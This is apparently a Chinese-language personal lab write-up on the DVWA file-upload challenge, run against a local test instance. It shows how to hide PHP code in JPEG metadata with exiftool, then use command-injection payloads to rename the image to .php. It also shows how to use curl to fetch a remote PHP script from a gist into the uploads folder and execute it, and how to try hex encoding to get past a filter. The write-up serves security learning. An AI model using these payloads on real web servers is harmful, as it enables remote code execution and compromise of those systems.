# File Upload

> Execute any PHP function of your choosing on the target system (such as phpinfo()	or system()) thanks to this file upload vulnerability.

> Once the file has been received from the client, the server will try to resize any image that was included in the request.

我大概會往這幾個個方思考:

1. 對檔案動手腳 ([executable image file](https://www.vijayan.in/create-executable-images/) or metadata or binary data)
2. 測試看看上傳多個檔案
3. 也許處理檔案的部分的程式或 function, lib 有什麼缺陷

如果要在檔案內動手腳 (binary) 或者找底層缺陷的話，我不太熟所以先跳過 QQ

先挑簡單一點的方式，就是沿用在 medium 時透過 coomand injection 改上傳圖片檔名的方式 (只是這次改成上傳可執行的圖檔)，之後再來試試擷取 metadata 的方式

修改 metadata 則是要有兩個前提要成立:

1. 上傳後 metadata 沒有損壞
2. 上傳後有辦法取出 (或不取出直接執行) metadata 的內容並執行它們

想好策略後就可以開始了

## 成功的流程

```markdown
1. use exiftool to add metadata
2. upload file
3. command injection (for renaming file eg, image.jpg -> image.php)
```

### use exiftool to add metadata

剛開始是想說往隱寫術的方向去找，但後來覺得要反過來讀取藏匿在圖片中的的資料會比較麻煩，所以才選擇找找看有沒有人試過 metadata + executable 這兩個關鍵字去搜尋，因為讀取圖片 metadata 比讀取隱寫術寫入的資料還容易．

結果真的有人這麼做，就借用他的寫法了

[Injecting executable PHP code to a JPG image file - One Step! Code](https://onestepcode.com/injecting-php-code-to-jpg/)

```php
<?php phpinfo(); __halt_compiler(); ?>
```
### use exiftool to add metadata

```bash
exiftool -Comment="<?php phpinfo(); __halt_compiler(); ?>" demo.jpg
```

### upload file

接著上傳 jpg 圖片

```
../../hackable/uploads/demo.jpg succesfully uploaded!
```

觀察上傳後 (位於 DVWA uploads 資料夾內) 的檔案，它的 metadata 也沒有被損毀

目前為止已經上傳惡意檔案，接下來就是想辦法執行這個檔案
可以利用 command line injection 來下指令，這樣就能夠再把上傳的 .jpg 檔改成 .php
這樣就可以讓它被執行，因為 metadata 裡有可執行的內容

### command injection (for renaming file)

```bash
'' || cp ../../hackable/uploads/demo.jpg ../../hackable/uploads/demo.php
```

```bash
Go to http://dvwa.localtest/hackable/uploads/demo.php
```

![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/a1b56a4c-6866-47dc-b751-4c19d245f451/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220220T042142Z&X-Amz-Expires=86400&X-Amz-Signature=53b76340b3bc6dcd2f633d39445b9147552a4829403cbba909227beadb550b95&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

### 心得

- 學到在 metadata 塞入可執行內容的技巧，也就是這段:

```php
<?php phpinfo(); __halt_compiler(); ?>
```

- 思路有點類似在機場要偷渡危險物品通關一樣，我們可以把要偷渡的物品分解或改變特徵，以躲避掃描或探測器，之後再將危險物品重組恢復成原樣
- 無法繞路的話只好包裝成合法的方式通關了

### Ref

Create Executable Images – Vijayan’s Blog
[https://www.vijayan.in/create-executable-images/](https://www.vijayan.in/create-executable-images/)

Injecting executable PHP code to a JPG image file - One Step! Code
[https://onestepcode.com/injecting-php-code-to-jpg/](https://onestepcode.com/injecting-php-code-to-jpg/)

## 失敗紀錄

因為想在 command injection 之後嘗試不同的執行檔案方式，所以多紀錄了這部分 (省略 exiftool 和上傳流程)

因為目標網站上不太可能有 `exiftool` 讓你使用 (當然你有權限的話也可以直接安裝)，所以得自行使用目標網站上現成的 runtime 或指令 e.g: php or bash

### prepare remote file

來驗證一下攻擊是否能成功

先準備一隻提取 metadata 用的腳本 reader.php，並把它存放在遠端

測試看看是否能讀取到 metadata

`reader.php`
```php
<?php
echo "demo.jpg:\n";
$exif = exif_read_data('demo.jpg', 'IFD0');
echo $exif===false ? "No header data found.<br />\n" : "Image contains headers<br />\n";

$exif = exif_read_data('demo.jpg', 0, true);
echo "meta data:\n";
foreach ($exif as $key => $section) {
    foreach ($section as $name => $val) {
        echo "$key.$name: $val\n";
    }
}
?>
```

確認有讀取到 comment

```markdown
php reader.php 
```

```php
demo.jpg:
Image contains headers<br />
meta data:
FILE.FileName: demo.jpg
FILE.FileDateTime: 1645256596
FILE.FileSize: 56651
FILE.FileType: 2
FILE.MimeType: image/jpeg
FILE.SectionsFound: ANY_TAG, IFD0, COMMENT, EXIF
COMPUTED.html: width="548" height="436"
COMPUTED.Height: 436
COMPUTED.Width: 548
COMPUTED.IsColor: 1
COMPUTED.ByteOrderMotorola: 1
IFD0.Orientation: 1
IFD0.XResolution: 96/1
IFD0.YResolution: 96/1
IFD0.ResolutionUnit: 2
COMMENT.0: <?php phpinfo(); ?>
EXIF.ColorSpace: 1
EXIF.ExifImageWidth: 548
EXIF.ExifImageLength: 436
```

之後再修改一下

`reader.php`
```php
<?php
$exif = exif_read_data('demo.jpg', 0, true);
foreach ($exif as $key => $section) {
    foreach ($section as $name => $val) {
        if ($key == "COMMENT") {
            echo $val;
        }
    }
}
?>
```

現在它應該只會輸出一行 `<?php phpinfo(); ?>`

```markdown
php reader.php demo.jpg
```

```markdown
<?php phpinfo(); ?>
```
### command injection

command injection 會移除 `( ) -` ，所以想要透過 command injection 直接寫入檔案會遇到比較多阻礙，因此直接從遠端抓取你已經寫好的擷取 exif 的腳本會比較簡單

所以有不少限制，在嘗試了 php, wget, curl 之後，用 curl 成功下載遠端檔案

```php
Go to http://dvwa.localtest/vulnerabilities/exec/
```

### get remote file

在 command injection 頁面執行下載遠端檔案的指令

```bash
'' || curl "https://gist.githubusercontent.com/vansteki/aebcbf87c927f388ef2b1b0f5275b1bc/raw/729ee503d20a61aa9ece0368f86148bace177f69/readexif.php" > ../../hackable/uploads/reader.php
```

這時 /hackable/uploads/ 內的檔案應該會有 reader.php 和剛剛上傳的圖片

```php
'' || ls ../../hackable/uploads
```

```bash
demo.jpg
dvwa_email.png
reader.php
```

### write file

接著只執行 reader.php，讓它將從圖片 meta data 讀取到的內容輸出到 info.php

```bash
'' || php ../../hackable/uploads/reader.php > ../../hackable/uploads/info.php
```

檢查看看是否有成功輸出 info.php

```bash
'' || ls ../../hackable/uploads
```

```markdown
demo-eval.jpg
demo.jpg
dvwa_email.png
info.php
reader.php
```

執行 info.php

```html
http://dvwa.localtest/hackable/upload/info.php
```

疑 畫面空白 哭啊 輸出失敗 QQ

因為 command injection 有過濾的關係，輸出內容有 `( )`

可以試試看用 hex

```bash
echo "\x28 \x29"
// ( )
```

```bash
exiftool -Comment="<?php phpinfo\x28 \x29; ?>" demo.jpg
```

- To Hex - CyberChef
[https://gchq.github.io/CyberChef/#recipe=To_Hex('\\x',0)&input=PD9waHAgcGhwaW5mbygpOyA/Pg](https://gchq.github.io/CyberChef/#recipe=To_Hex('%5C%5Cx',0)&input=PD9waHAgcGhwaW5mbygpOyA/Pg)
```bash
'' || echo "\x70\x68\x70\x20\x70\x68\x70\x69\x6e\x66\x6f\x28\x29\x3b\x20\x3f\x3e"
```

一樣會失敗．因為字串會輸出 command line injection，如果其中一段因為過濾噴掉，整個流程就會被中斷，因此要想辦法使用不會被輸出阻礙的方法

只剩下更改檔名最穩

或者是將輸出導到 env 搭配背景執行 ?

感覺很迂迴

另外也可以將輸出和執行的步驟用 `eval()` 簡化，但在這個場景應該一樣會失效

總結攻擊流程:

```markdown
1. use exiftool to add metadata
2. upload file
3. command injection
4. get remote file 
5. write or eval file
```

很華麗的失敗了 ✨
